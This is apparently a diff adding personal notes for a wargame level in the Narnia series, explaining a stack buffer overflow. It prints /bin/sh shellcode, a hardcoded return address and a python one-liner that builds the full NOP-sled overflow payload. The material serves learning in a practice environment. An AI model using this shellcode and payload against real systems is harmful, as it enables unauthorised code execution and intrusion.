@@ -1,0 +1,14 @@
+same overflow idea as narnia2: overwrite return ip to point to our buffer, filled with shellcode, and padded with nops.
+
+** original plan to put the shell code at the end of the buffer, right before the return address didnt work:
+the shell code pushed values in to the stack which made it to overwrite its own code (esp value was where the shellcode was inside the stack)
+*** solution: move the shellcode to the middle of the buffer and keeping a safe distance from esp.
+
+final resault:
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" - the shell code: 28 bytes
+0xffffd4fc = "\xfc\xd4\xff\xff" - the return address
+
+		front padd										back pad (could any value it doesnt matter - just for the overflow)
+$(python -c 'print "\x90"*150 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*91 + "\xfc\xd4\xff\xff"')
+ 
